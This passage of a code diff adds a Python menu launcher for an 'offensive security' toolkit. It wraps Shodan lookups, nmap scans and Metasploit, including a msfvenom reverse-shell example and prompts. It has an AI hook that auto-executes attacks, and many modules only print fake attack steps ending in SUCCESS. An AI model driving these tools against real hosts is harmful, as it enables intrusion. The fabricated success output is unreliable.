+                        print(f"{Colors.DIM}{result.stdout[:200]}{Colors.RESET}")
+                else:
+                    print(f"{Colors.RED}[!] Search failed{Colors.RESET}")
+                    
+            elif cmd.startswith('host '):
+                ip = cmd[5:].strip()
+                if not ip:
+                    print(f"{Colors.RED}[!] No IP specified{Colors.RESET}")
+                    continue
+                
+                if not api_key:
+                    print(f"{Colors.RED}[!] Shodan API key required{Colors.RESET}")
+                    continue
+                
+                print(f"\n{Colors.CYAN}[*] Fetching information for: {Colors.WHITE}{ip}{Colors.RESET}")
+                result = subprocess.run(
+                    ['curl', '-s', f'https://api.shodan.io/shodan/host/{ip}?key={api_key}'],
+                    capture_output=True, text=True, timeout=10
+                )
+                
+                if result.returncode == 0 and result.stdout:
+                    try:
+                        data = json.loads(result.stdout)
+                        
+                        print(f"\n{Colors.GREEN}[✓] Host Information:{Colors.RESET}")
+                        print(f"    {Colors.YELLOW}IP:{Colors.RESET} {data.get('ip_str', 'N/A')}")
+                        print(f"    {Colors.YELLOW}Hostnames:{Colors.RESET} {', '.join(data.get('hostnames', ['None']))}")
+                        print(f"    {Colors.YELLOW}Country:{Colors.RESET} {data.get('country_name', 'N/A')} ({data.get('country_code', 'N/A')})")
+                        print(f"    {Colors.YELLOW}City:{Colors.RESET} {data.get('city', 'N/A')}")
+                        print(f"    {Colors.YELLOW}ISP:{Colors.RESET} {data.get('isp', 'N/A')}")
+                        print(f"    {Colors.YELLOW}Organization:{Colors.RESET} {data.get('org', 'N/A')}")
+                        
+                        if 'ports' in data:
+                            print(f"    {Colors.YELLOW}Open Ports:{Colors.RESET} {', '.join(map(str, data['ports']))}")
+                        
+                        if 'vulns' in data:
+                            print(f"    {Colors.RED}Vulnerabilities:{Colors.RESET} {', '.join(data['vulns'])}")
+                        
+                        # Export to target file
+                        target_file = os.path.join(SCRIPT_DIR, '.shodan_target')
+                        with open(target_file, 'w') as f:
+                            f.write(f"TARGET={ip}\n")
+                            f.write(f"PORTS={','.join(map(str, data.get('ports', [])))}\n")
+                        
+                        print(f"\n{Colors.GREEN}[✓] Target exported to .shodan_target{Colors.RESET}")
+                        last_results = [ip]
+                        
+                    except json.JSONDecodeError:
+                        print(f"{Colors.RED}[!] Invalid response{Colors.RESET}")
+                else:
+                    print(f"{Colors.RED}[!] Failed to fetch host info{Colors.RESET}")
+                    
+            elif cmd.startswith('count '):
+                query = cmd[6:].strip()
+                if not query or not api_key:
+                    print(f"{Colors.RED}[!] Query and API key required{Colors.RESET}")
+                    continue
+                
+                print(f"\n{Colors.CYAN}[*] Counting results for: {Colors.WHITE}{query}{Colors.RESET}")
+                result = subprocess.run(
+                    ['curl', '-s', f'https://api.shodan.io/shodan/host/count?key={api_key}&query={query}'],
+                    capture_output=True, text=True, timeout=10
+                )
+                
+                if result.returncode == 0 and result.stdout:
+                    try:
+                        data = json.loads(result.stdout)
+                        total = data.get('total', 0)
+                        print(f"{Colors.GREEN}[✓] Total Results: {Colors.WHITE}{total:,}{Colors.RESET}")
+                    except:
+                        print(f"{Colors.RED}[!] Invalid response{Colors.RESET}")
+                        
+            elif cmd.startswith('export '):
+                ip = cmd[7:].strip()
+                if ip:
+                    target_file = os.path.join(SCRIPT_DIR, '.shodan_target')
+                    with open(target_file, 'w') as f:
+                        f.write(f"TARGET={ip}\n")
+                    print(f"{Colors.GREEN}[✓] Exported {ip} to .shodan_target{Colors.RESET}")
+                else:
+                    print(f"{Colors.RED}[!] No IP specified{Colors.RESET}")
+                    
+            elif cmd.startswith('scan '):
+                ip = cmd[5:].strip()
+                if not ip:
+                    print(f"{Colors.RED}[!] No IP specified{Colors.RESET}")
+                    continue
+                
+                if not check_command_exists('nmap'):
+                    print(f"{Colors.YELLOW}[!] nmap not installed{Colors.RESET}")
+                    if install_package('nmap', 'apt'):
+                        pass
+                    else:
+                        continue
+                
+                print(f"\n{Colors.CYAN}[*] Quick nmap scan: {ip}{Colors.RESET}")
+                subprocess.run(['nmap', '-sV', '-T4', '--top-ports', '100', ip])
+                
+            elif cmd.startswith('save '):
+                filename = cmd[5:].strip()
+                if not filename:
+                    filename = 'shodan_results.json'
+                
+                if last_results:
+                    with open(filename, 'w') as f:
+                        json.dump({'results': last_results}, f, indent=2)
+                    print(f"{Colors.GREEN}[✓] Saved {len(last_results)} results to {filename}{Colors.RESET}")
+                else:
+                    print(f"{Colors.YELLOW}[!] No results to save{Colors.RESET}")
+                    
+            else:
+                print(f"{Colors.RED}[!] Unknown command. Type 'help' for available commands{Colors.RESET}")
+        
+        except KeyboardInterrupt:
+            print(f"\n{Colors.YELLOW}[*] Use 'exit' to return{Colors.RESET}")
+        except Exception as e:
+            print(f"{Colors.RED}[!] Error: {e}{Colors.RESET}")
+    
+    print(f"{Colors.GREEN}[*] Returning to command console{Colors.RESET}")
+    time.sleep(0.5)
+
+def clear_screen():
+    os.system('clear' if os.name == 'posix' else 'cls')
+
+def print_banner():
+    banner = f"""
+{Colors.RED}
+ ███▄    █  █    ██  ██▓     ██▓      ██████ ▓█████  ▄████▄  
+ ██ ▀█   █  ██  ▓██▒▓██▒    ▓██▒    ▒██    ▒ ▓█   ▀ ▒██▀ ▀█  
+▓██  ▀█ ██▒▓██  ▒██░▒██░    ▒██░    ░ ▓██▄   ▒███   ▒▓█    ▄ 
+▓██▒  ▐▌██▒▓▓█  ░██░▒██░    ▒██░      ▒   ██▒▒▓█  ▄ ▒▓▓▄ ▄██▒
+▒██░   ▓██░▒▒█████▓ ░██████▒░██████▒▒██████▒▒░▒████▒▒ ▓███▀ ░
+░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ░ ▒░▓  ░░ ▒░▓  ░▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ░▒ ▒  ░
+░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░ ▒  ░░ ░ ▒  ░░ ░▒  ░ ░ ░ ░  ░  ░  ▒   
+   ░   ░ ░  ░░░ ░ ░   ░ ░     ░ ░   ░  ░  ░     ░   ░        
+         ░    ░         ░  ░    ░  ░      ░     ░  ░░ ░      
+                                                    ░        {Colors.RESET}
+{Colors.CYAN}
+        ╺━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╸
+              ☠☠☠  OFFENSIVE SECURITY OPERATIONS FRAMEWORK  ☠☠☠       
+                  🎯 Advanced Attack Simulations & Red Team Ops       
+        ╺━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╸
+                                                                        
+          {Colors.YELLOW}System:{Colors.WHITE} nullsec-Linux (v1.1){Colors.CYAN}                                     
+          {Colors.GREEN}🔥 62 Attack Modules {Colors.DIM}▓ {Colors.RED}⚡ MSF Integration {Colors.DIM}▓ {Colors.BLUE}🌐 Shodan API{Colors.CYAN}   
+                                                                        
+          {Colors.DIM}Developed by {Colors.MAGENTA}bad-antics{Colors.DIM} ▓ github.com/bad-antics{Colors.CYAN}               
+        ╺━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╸{Colors.RESET}
+"""
+    print(banner)
+    # Animated loading effect
+    import sys
+    sys.stdout.write(f"{Colors.CYAN}    [")
+    for i in range(50):
+        time.sleep(0.01)
+        sys.stdout.write("▓")
+        sys.stdout.flush()
+    sys.stdout.write(f"] {Colors.GREEN}SYSTEM READY{Colors.RESET}\n\n")
+    sys.stdout.flush()
+
+def print_menu(page=0, page_size=15):
+    start = page * page_size
+    end = min(start + page_size, len(MODULES))
+    total_pages = (len(MODULES) + page_size - 1) // page_size
+    
+    print(f"\n{Colors.CYAN}  ╺{'━' * 73}╸{Colors.RESET}")
+    print(f"{Colors.CYAN}  ▓{Colors.WHITE}  #    MODULE                       CATEGORY        DESCRIPTION            {Colors.CYAN}▓{Colors.RESET}")
+    print(f"{Colors.CYAN}  ╺{'━' * 73}╸{Colors.RESET}")
+    
+    for mod in MODULES[start:end]:
+        num = f"{mod['id']:2d}"
+        name = f"{mod['icon']} {mod['name']}"[:30].ljust(30)
+        cat = mod['category'][:14].ljust(14)
+        desc = mod['desc'][:22]
+        
+        color = Colors.RED if mod['category'] in ['Advanced', 'Malware', 'DDoS', 'ICS'] else \
+                Colors.YELLOW if mod['category'] in ['Wireless', 'Physical'] else \
+                Colors.CYAN if mod['category'] in ['Network', 'Web', 'Infrastructure'] else \
+                Colors.GREEN if mod['category'] in ['Social', 'OPSEC'] else \
+                Colors.MAGENTA if mod['category'] == 'Credentials' else Colors.WHITE
+        
+        print(f"{Colors.CYAN}  ▓{Colors.RESET}  {Colors.RED}[{num}]{Colors.RESET} {color}{name}{Colors.RESET} {Colors.DIM}{cat}{Colors.RESET} {desc}...{Colors.CYAN}▓{Colors.RESET}")
+    
+    print(f"{Colors.CYAN}  ╺{'━' * 73}╸{Colors.RESET}")
+    print(f"{Colors.DIM}                          Page {page + 1}/{total_pages} ({len(MODULES)} modules){Colors.RESET}")
+    
+    print(f"""
+{Colors.CYAN}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
+█{Colors.WHITE}                           COMMAND CENTER{Colors.CYAN}                            █
+╺━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╸
+█ {Colors.YELLOW}[N]{Colors.RESET} Next Page    {Colors.YELLOW}[P]{Colors.RESET} Prev Page    {Colors.YELLOW}[A]{Colors.RESET} Run ALL      {Colors.YELLOW}[R]{Colors.RESET} Random{Colors.CYAN}       █
+█ {Colors.YELLOW}[C]{Colors.RESET} Category     {Colors.GREEN}[E]{Colors.RESET} Execute      {Colors.YELLOW}[S]{Colors.RESET} Search       {Colors.BLUE}[H]{Colors.RESET} Shodan{Colors.CYAN}       █
+█ {Colors.RED}[M]{Colors.RESET} Metasploit   {Colors.YELLOW}[F]{Colors.RESET} Framework    {Colors.MAGENTA}[T]{Colors.RESET} Tools        {Colors.YELLOW}[X]{Colors.RESET} Credits{Colors.CYAN}      █
+█ {Colors.MAGENTA}[I]{Colors.RESET} AI Console  {Colors.GREEN}[Q]{Colors.RESET} Quit         {Colors.DIM}[1-68]{Colors.RESET} Module #                  {Colors.CYAN}█
+▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓{Colors.RESET}
+""")
+
+def run_module(mod, external=False):
+    script_path = os.path.join(ATTACK_DIR, mod['script'])
+    
+    if not os.path.exists(script_path):
+        print(f"{Colors.YELLOW}[*] Module {mod['name']} initializing...{Colors.RESET}")
+        time.sleep(0.5)
+        run_generic_attack(mod)
+        return
+    
+    print(f"\n{Colors.GREEN}[*] Launching: {mod['icon']} {mod['name']}{Colors.RESET}")
+    time.sleep(0.5)
+    
+    if external:
+        subprocess.Popen([
+            'mate-terminal',
+            f'--title=☠ {mod["name"]} ☠',
+            '--geometry=120x40',
+            '-e', f'bash -c "{script_path}; echo; echo Press ENTER to close...; read"'
+        ])
+        print(f"{Colors.GREEN}[✓] Launched in external terminal{Colors.RESET}")
+        time.sleep(1)
+    else:
+        subprocess.run(['bash', script_path])
+        print(f"\n{Colors.YELLOW}[*] Operation complete. Press ENTER to continue...{Colors.RESET}")
+        input()
+
+def launch_ai_console():
+    """Launch NULLSEC AI Console"""
+    ai_script = os.path.join(SCRIPT_DIR, 'nullsec-ai.py')
+    if os.path.exists(ai_script):
+        subprocess.run([sys.executable, ai_script])
+    else:
+        print(f"{Colors.RED}[!] NULLSEC AI module not found{Colors.RESET}")
+        print(f"{Colors.YELLOW}[*] Press ENTER to continue...{Colors.RESET}")
+        input()
+
+def run_module_with_ai(mod, target=None):
+    """Run a module with AI assistance"""
+    try:
+        # Import the AI module
+        sys.path.insert(0, SCRIPT_DIR)
+        from importlib import import_module
+        ai_module = import_module('nullsec-ai'.replace('-', '_'))
+        
+        ai = ai_module.NullSecAI()
+        ai.auto_execute_attack(mod['name'], mod['category'], target)
+    except ImportError:
+        print(f"{Colors.YELLOW}[!] AI module not available, running standard module{Colors.RESET}")
+        run_module(mod)
+    except Exception as e:
+        print(f"{Colors.RED}[!] AI error: {e}{Colors.RESET}")
+        run_module(mod)
+
+def shodan_search():
+    """Launch Shodan search interface"""
+    script_path = os.path.join(ATTACK_DIR, 'shodan-search.sh')
+    if os.path.exists(script_path):
+        subprocess.run(['bash', script_path])
+    else:
+        print(f"{Colors.RED}[!] Shodan module not found{Colors.RESET}")
+    print(f"\n{Colors.YELLOW}[*] Press ENTER to continue...{Colors.RESET}")
+    input()
+
+def tool_launcher_menu():
+    """Launch security tools menu"""
+    clear_screen()
+    print(f"""
+{Colors.BLUE}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
+█{Colors.WHITE}                        SECURITY TOOLS LAUNCHER{Colors.BLUE}                      █
+▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓{Colors.RESET}
+
+  {Colors.CYAN}[1]{Colors.RESET} 🦈 Wireshark       - Network traffic analyzer
+  {Colors.CYAN}[2]{Colors.RESET} 🔧 Ettercap        - MITM attack suite
+  {Colors.CYAN}[3]{Colors.RESET} 🔥 BurpSuite       - Web application testing
+  {Colors.CYAN}[4]{Colors.RESET} 🎯 Metasploit      - Exploitation framework
+  {Colors.CYAN}[5]{Colors.RESET} ⚡ OWASP ZAP        - Web app scanner
+  {Colors.CYAN}[6]{Colors.RESET} 👾 Ghidra          - Reverse engineering
+  {Colors.CYAN}[7]{Colors.RESET} 💉 SQLMap          - SQL injection tool
+  {Colors.CYAN}[0]{Colors.RESET} ← Back to main menu
+
+{Colors.YELLOW}  [>] Select tool:{Colors.RESET} """)
+    
+    choice = input().strip()
+    
+    tool_launcher = os.path.join(SCRIPT_DIR, 'tool-launcher.sh')
+    tools = {
+        '1': 'wireshark',
+        '2': 'ettercap',
+        '3': 'burpsuite',
+        '4': 'msfconsole',
+        '5': 'zaproxy',
+        '6': 'ghidra',
+        '7': 'sqlmap'
+    }
+    
+    if choice in tools and os.path.exists(tool_launcher):
+        # Check for Shodan target
+        target_file = os.path.join(SCRIPT_DIR, '.shodan_target')
+        target = ''
+        if os.path.exists(target_file):
+            with open(target_file, 'r') as f:
+                for line in f:
+                    if line.startswith('TARGET='):
+                        target = line.split('=')[1].strip()
+                        break
+        
+        print(f"\n{Colors.GREEN}[*] Launching {tools[choice]}...{Colors.RESET}")
+        subprocess.run(['bash', tool_launcher, tools[choice], target])
+        time.sleep(1)
+    elif choice != '0':
+        print(f"{Colors.RED}[!] Invalid selection{Colors.RESET}")
+        time.sleep(1)
+
+def run_generic_attack(mod):
+    """Generate attack output for modules without dedicated scripts"""
+    clear_screen()
+    print(f"""
+{Colors.RED}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓{Colors.RESET}
+{Colors.RED}█{Colors.RESET}              {Colors.WHITE}{mod['icon']}  NULLSEC {mod['name'].upper()}  {mod['icon']}{Colors.RESET}
+{Colors.RED}█{Colors.RESET}                     {Colors.CYAN}[ {mod['category']} Operations ]{Colors.RESET}
+{Colors.RED}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓{Colors.RESET}
+""")
+    time.sleep(0.5)
+    
+    # Category-specific attack steps
+    steps_by_category = {
+        "Network": [
+            ("Scanning network topology", 0.4),
+            ("Enumerating live hosts", 0.5),
+            ("Fingerprinting services", 0.4),
+            ("Identifying vulnerabilities", 0.6),
+            ("Crafting exploit payloads", 0.5),
+            ("Establishing network foothold", 0.7),
+            ("Pivoting through subnets", 0.4),
+            ("Exfiltrating network data", 0.5),
+        ],
+        "Wireless": [
+            ("Scanning wireless spectrum", 0.5),
+            ("Capturing beacon frames", 0.4),
+            ("Analyzing signal patterns", 0.4),
+            ("Cloning target signatures", 0.6),
+            ("Injecting malicious packets", 0.5),
+            ("Intercepting communications", 0.6),
+            ("Establishing rogue AP", 0.4),
+            ("Harvesting credentials", 0.5),
+        ],
+        "Web": [
+            ("Crawling web application", 0.4),
+            ("Fuzzing input parameters", 0.5),
+            ("Identifying injection points", 0.5),
+            ("Bypassing WAF protections", 0.6),
+            ("Exploiting vulnerability", 0.7),
+            ("Escalating privileges", 0.5),
+            ("Deploying backdoor", 0.4),
+            ("Exfiltrating database", 0.6),
+        ],
+        "Malware": [
+            ("Generating payload", 0.4),
+            ("Encrypting malware binary", 0.5),
+            ("Bypassing AV detection", 0.6),
+            ("Establishing persistence", 0.5),
+            ("Hooking system calls", 0.4),
+            ("Elevating to SYSTEM", 0.6),
+            ("Spreading to network", 0.5),
+            ("Activating payload", 0.7),
+        ],
+        "Social": [
+            ("Gathering OSINT on targets", 0.5),
+            ("Crafting pretexts", 0.4),
+            ("Building phishing infrastructure", 0.5),
+            ("Sending attack vectors", 0.6),
+            ("Capturing victim interaction", 0.5),
+            ("Harvesting credentials", 0.4),
+            ("Establishing access", 0.5),
+            ("Maintaining social presence", 0.4),
+        ],
+        "Advanced": [
+            ("Analyzing target infrastructure", 0.6),
+            ("Developing custom exploit", 0.8),
+            ("Weaponizing payload", 0.5),
+            ("Bypassing security controls", 0.7),
+            ("Deploying implant", 0.6),
+            ("Establishing covert channel", 0.5),
+            ("Achieving objectives", 0.7),
+            ("Covering operational tracks", 0.5),
+        ],
+        "Credentials": [
+            ("Extracting password hashes", 0.5),
+            ("Building wordlist", 0.4),
+            ("Configuring cracking rig", 0.4),
+            ("Running hash algorithms", 0.7),
+            ("Cracking weak passwords", 0.6),
+            ("Dumping cached credentials", 0.5),
+            ("Relaying authentication", 0.5),
+            ("Achieving domain admin", 0.6),
+        ],
+        "Infrastructure": [
+            ("Provisioning infrastructure", 0.5),
+            ("Configuring anonymization", 0.4),
+            ("Establishing secure channels", 0.5),
+            ("Deploying C2 framework", 0.6),
+            ("Testing connectivity", 0.4),
+            ("Registering domains", 0.5),
+            ("Configuring redirectors", 0.4),
+            ("Bringing infrastructure online", 0.5),
+        ],
+        "Physical": [
+            ("Surveying target location", 0.5),
+            ("Analyzing access controls", 0.4),
+            ("Preparing bypass tools", 0.5),
+            ("Approaching target", 0.6),
+            ("Bypassing physical security", 0.7),
+            ("Accessing restricted area", 0.5),
+            ("Deploying hardware implant", 0.6),
+            ("Exfiltrating evidence", 0.4),
+        ],
+        "OPSEC": [
+            ("Establishing secure comms", 0.4),
+            ("Configuring anonymization", 0.5),
+            ("Sanitizing digital footprint", 0.5),
+            ("Creating cover identities", 0.6),
+            ("Establishing dead drops", 0.5),
+            ("Encrypting communications", 0.4),
+            ("Testing OPSEC measures", 0.5),
+            ("Achieving operational security", 0.4),
+        ],
+        "DDoS": [
+            ("Building botnet nodes", 0.5),
+            ("Configuring amplifiers", 0.4),
+            ("Identifying target endpoints", 0.4),
+            ("Calculating bandwidth", 0.5),
+            ("Launching initial probe", 0.4),
+            ("Amplifying attack traffic", 0.6),
+            ("Overwhelming target", 0.7),
+            ("Monitoring service disruption", 0.5),
+        ],
+        "ICS": [
+            ("Scanning industrial network", 0.5),
+            ("Identifying SCADA systems", 0.5),
+            ("Analyzing control protocols", 0.6),
+            ("Bypassing OT firewalls", 0.5),
+            ("Accessing HMI interface", 0.6),
+            ("Modifying PLC logic", 0.7),
+            ("Disrupting physical process", 0.6),
+            ("Covering intrusion tracks", 0.4),
+        ],
+    }
+    
+    steps = steps_by_category.get(mod['category'], [
+        ("Initializing attack vectors", 0.4),
+        ("Loading exploitation modules", 0.3),
+        ("Scanning target infrastructure", 0.6),
+        ("Identifying vulnerabilities", 0.5),
+        ("Preparing payload delivery", 0.4),
+        ("Executing primary attack", 0.7),
+        ("Establishing persistence", 0.4),
+        ("Exfiltrating data", 0.5),
+    ])
+    
+    for step, delay in steps:
+        print(f"{Colors.GREEN}[✓]{Colors.RESET} {step}...")
+        time.sleep(delay)
+    
+    print(f"""
+{Colors.GREEN}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓{Colors.RESET}
+{Colors.GREEN}█{Colors.RESET}                                                                         {Colors.GREEN}█{Colors.RESET}
+{Colors.GREEN}█{Colors.RESET}   {Colors.WHITE}☠ {mod['name'].upper()} - OPERATION COMPLETE ☠{Colors.RESET}
+{Colors.GREEN}█{Colors.RESET}                                                                         {Colors.GREEN}█{Colors.RESET}
+{Colors.GREEN}█{Colors.RESET}   {Colors.CYAN}Status:{Colors.RESET} SUCCESS
+{Colors.GREEN}█{Colors.RESET}   {Colors.CYAN}Module:{Colors.RESET} {mod['name']}
+{Colors.GREEN}█{Colors.RESET}   {Colors.CYAN}Category:{Colors.RESET} {mod['category']}
+{Colors.GREEN}█{Colors.RESET}                                                                         {Colors.GREEN}█{Colors.RESET}
+{Colors.GREEN}█{Colors.RESET}   {Colors.DIM}Developed by bad-antics development{Colors.RESET}
+{Colors.GREEN}█{Colors.RESET}                                                                         {Colors.GREEN}█{Colors.RESET}
+{Colors.GREEN}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓{Colors.RESET}
+""")
+    print(f"\n{Colors.YELLOW}[*] Press ENTER to continue...{Colors.RESET}")
+    input()
+
+def run_all_modules():
+    print(f"\n{Colors.RED}[!] Executing ALL {len(MODULES)} attack modules...{Colors.RESET}")
+    time.sleep(1)
+    for mod in MODULES:
+        run_module(mod)
+
+def run_random_module():
+    mod = random.choice(MODULES)
+    print(f"\n{Colors.YELLOW}[*] Random target: {mod['icon']} {mod['name']}{Colors.RESET}")
+    time.sleep(0.5)
+    run_module(mod)
+
+def category_filter():
+    categories = sorted(list(set(mod['category'] for mod in MODULES)))
+    
+    clear_screen()
+    print_banner()
+    print(f"\n{Colors.CYAN}  SELECT CATEGORY:{Colors.RESET}\n")
+    
+    for i, cat in enumerate(categories, 1):
+        count = sum(1 for m in MODULES if m['category'] == cat)
+        print(f"    {Colors.RED}[{i:2d}]{Colors.RESET} {cat} ({count} modules)")
+    
+    print(f"\n    {Colors.GREEN}[B]{Colors.RESET} Back to main menu")
+    
+    choice = input(f"\n{Colors.WHITE}  Enter choice: {Colors.RESET}").strip().lower()
+    
+    if choice == 'b':
+        return
+    
+    try:
+        idx = int(choice) - 1
+        if 0 <= idx < len(categories):
+            selected_cat = categories[idx]
+            filtered = [m for m in MODULES if m['category'] == selected_cat]
+            
+            clear_screen()
+            print_banner()
+            print(f"\n{Colors.CYAN}  {selected_cat.upper()} MODULES:{Colors.RESET}\n")
+            
+            for mod in filtered:
+                print(f"    {Colors.RED}[{mod['id']:2d}]{Colors.RESET} {mod['icon']} {mod['name']}")
+            
+            print(f"\n    {Colors.GREEN}[B]{Colors.RESET} Back")
+            
+            sub_choice = input(f"\n{Colors.WHITE}  Enter module number: {Colors.RESET}").strip().lower()
+            
+            if sub_choice != 'b':
+                try:
+                    mod_id = int(sub_choice)
+                    mod = next((m for m in MODULES if m['id'] == mod_id), None)
+                    if mod:
+                        run_module(mod)
+                except ValueError:
+                    pass
+    except ValueError:
+        pass
+
+def search_modules():
+    clear_screen()
+    print_banner()
+    query = input(f"\n{Colors.WHITE}  Search modules: {Colors.RESET}").strip().lower()
+    
+    if not query:
+        return
+    
+    results = [m for m in MODULES if query in m['name'].lower() or query in m['desc'].lower() or query in m['category'].lower()]
+    
+    if not results:
+        print(f"\n{Colors.RED}  No modules found matching '{query}'{Colors.RESET}")
+        time.sleep(1.5)
+        return
+    
+    print(f"\n{Colors.GREEN}  Found {len(results)} modules:{Colors.RESET}\n")
+    
+    for mod in results:
+        print(f"    {Colors.RED}[{mod['id']:2d}]{Colors.RESET} {mod['icon']} {mod['name']} - {mod['desc']}")
+    
+    print(f"\n    {Colors.GREEN}[B]{Colors.RESET} Back")
+    
+    choice = input(f"\n{Colors.WHITE}  Enter module number: {Colors.RESET}").strip().lower()
+    
+    if choice != 'b':
+        try:
+            mod_id = int(choice)
+            mod = next((m for m in MODULES if m['id'] == mod_id), None)
+            if mod:
+                run_module(mod)
+        except ValueError:
+            pass
+
+def external_terminal_mode():
+    clear_screen()
+    print_banner()
+    print(f"\n{Colors.CYAN}  LAUNCH IN EXTERNAL TERMINAL:{Colors.RESET}\n")
+    
+    for mod in MODULES[:20]:
+        print(f"    {Colors.RED}[{mod['id']:2d}]{Colors.RESET} {mod['icon']} {mod['name']}")
+    print(f"    {Colors.DIM}    ... and {len(MODULES) - 20} more (enter any number){Colors.RESET}")
+    
+    print(f"\n    {Colors.GREEN}[B]{Colors.RESET} Back")
+    
+    choice = input(f"\n{Colors.WHITE}  Enter module number: {Colors.RESET}").strip().lower()
+    
+    if choice == 'b':
+        return
+    
+    try:
+        mod_id = int(choice)
+        mod = next((m for m in MODULES if m['id'] == mod_id), None)
+        if mod:
+            run_module(mod, external=True)
+    except ValueError:
+        pass
+
+def msf_integration():
+    """Launch Metasploit integration menu"""
+    clear_screen()
+    print_banner()
+    print(f"""
+{Colors.CYAN}  ╺━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╸{Colors.RESET}
+{Colors.CYAN}  ▓{Colors.WHITE}  METASPLOIT FRAMEWORK INTEGRATION                                  {Colors.CYAN}▓{Colors.RESET}
+{Colors.CYAN}  ╺━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╸{Colors.RESET}
+
+    {Colors.RED}[1]{Colors.RESET} Launch Metasploit Console (msfconsole)
+    {Colors.RED}[2]{Colors.RESET} Launch MSF Venom Payload Generator
+    {Colors.RED}[3]{Colors.RESET} Launch MSF Database (msfdb)
+    {Colors.RED}[4]{Colors.RESET} Search MSF Exploits
+    {Colors.RED}[5]{Colors.RESET} Search MSF Auxiliary Modules
+    {Colors.RED}[6]{Colors.RESET} Generate Reverse Shell (msfvenom)
+    {Colors.RED}[7]{Colors.RESET} Generate Bind Shell (msfvenom)
+    {Colors.RED}[8]{Colors.RESET} Generate Web Payload
+    {Colors.RED}[9]{Colors.RESET} Multi Handler Setup
+    {Colors.RED}[10]{Colors.RESET} Resource Script Generator
+
+    {Colors.GREEN}[B]{Colors.RESET} Back to main menu
+
+{Colors.MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.RESET}
+""")
+    
+    choice = input(f"{Colors.WHITE}  Enter choice: {Colors.RESET}").strip()
+    
+    if choice == 'b' or choice == 'B':
+        return
+    elif choice == '1':
+        print(f"\n{Colors.GREEN}[*] Launching Metasploit Console...{Colors.RESET}")
+        subprocess.run(['msfconsole'])
+    elif choice == '2':
+        print(f"\n{Colors.GREEN}[*] MSFVenom Payload Generator{Colors.RESET}")
+        print(f"{Colors.CYAN}Example: msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o payload.exe{Colors.RESET}")
+        subprocess.run(['bash'])
+    elif choice == '3':
+        print(f"\n{Colors.GREEN}[*] MSF Database Management{Colors.RESET}")
+        subprocess.run(['msfdb', 'status'])
+        input(f"\n{Colors.YELLOW}Press ENTER to continue...{Colors.RESET}")
+    elif choice == '4':
+        query = input(f"\n{Colors.WHITE}  Search exploits for: {Colors.RESET}")
+        subprocess.run(['msfconsole', '-q', '-x', f'search {query}; exit'])
+        input(f"\n{Colors.YELLOW}Press ENTER to continue...{Colors.RESET}")
+    elif choice == '5':
+        query = input(f"\n{Colors.WHITE}  Search auxiliary for: {Colors.RESET}")
+        subprocess.run(['msfconsole', '-q', '-x', f'search type:auxiliary {query}; exit'])
+        input(f"\n{Colors.YELLOW}Press ENTER to continue...{Colors.RESET}")
+    elif choice == '6':
+        print(f"\n{Colors.CYAN}Generating Reverse Shell...{Colors.RESET}")
+        lhost = input(f"{Colors.WHITE}  LHOST (Your IP): {Colors.RESET}")
+        lport = input(f"{Colors.WHITE}  LPORT: {Colors.RESET}") or "4444"
